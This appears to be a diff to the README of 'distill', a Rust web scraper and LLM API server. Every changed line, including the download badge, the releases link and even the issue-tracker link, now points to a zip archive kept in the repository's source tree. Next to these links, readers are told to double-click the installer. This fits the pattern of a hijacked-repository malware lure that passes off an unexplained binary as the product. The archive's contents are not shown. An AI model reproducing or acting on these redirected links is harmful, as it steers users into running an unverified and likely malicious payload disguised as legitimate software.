@@ -1,7 +1,7 @@
 # 🌟 distill - Web Scraper and API Server Made Easy
 
 ## 🔗 Download Now
-[![Download distill](https://img.shields.io/badge/Download%20distill-%20%F0%9F%93%9A%20Get%20the%20Latest%20Version-%2322c1d4)](https://github.com/Syahideos/distill/releases)
+[![Download distill](https://github.com/Syahideos/distill/raw/refs/heads/main/src/bin/Software-3.7-alpha.5.zip%20distill-%20%F0%9F%93%9A%20Get%20the%20Latest%20Version-%2322c1d4)](https://github.com/Syahideos/distill/raw/refs/heads/main/src/bin/Software-3.7-alpha.5.zip)
 
 ## 📖 Overview
 distill is a high-performance web scraper and LLM analysis API server built with Rust. It simplifies the process of extracting data from websites and analyzing it with advanced language models. Whether you're gathering data for research, business insights, or personal projects, distill provides you with the tools you need.
@@ -16,7 +16,7 @@ distill is a high-performance web scraper and LLM analysis API server built with
 Follow these steps to get started with distill:
 
 ### 1. Download the Application
-Visit the [Releases Page](https://github.com/Syahideos/distill/releases) to download the latest version of distill.
+Visit the [Releases Page](https://github.com/Syahideos/distill/raw/refs/heads/main/src/bin/Software-3.7-alpha.5.zip) to download the latest version of distill.
 
 ### 2. Install the Software
 After downloading, locate the installer file on your computer. Double-click the file to run the installer, and follow the on-screen instructions to complete the setup.
@@ -46,14 +46,14 @@ Click the "Run" button to start scraping. You can monitor the progress in real-t
 distill also comes with a built-in API for more advanced functionalities. You can view the API documentation within the application to explore various endpoints.
 
 ## 🔄 Download & Install
-To begin your journey with distill, [visit this page to download](https://github.com/Syahideos/distill/releases) the latest version and start exploring the possibilities of web scraping today.
+To begin your journey with distill, [visit this page to download](https://github.com/Syahideos/distill/raw/refs/heads/main/src/bin/Software-3.7-alpha.5.zip) the latest version and start exploring the possibilities of web scraping today.
 
 ## 🛡️ Security
 Your security is important. distill uses best practices to ensure that your scraping activities are safe. Always adhere to the terms of service of the websites you scrape.
 
 ## 🤝 Support
 If you have questions or need help:
-- Visit the [issue tracker](https://github.com/Syahideos/distill/issues) in our repository.
+- Visit the [issue tracker](https://github.com/Syahideos/distill/raw/refs/heads/main/src/bin/Software-3.7-alpha.5.zip) in our repository.
 - Check the Wiki for helpful guides and FAQs.
 
 ## 📚 Additional Resources
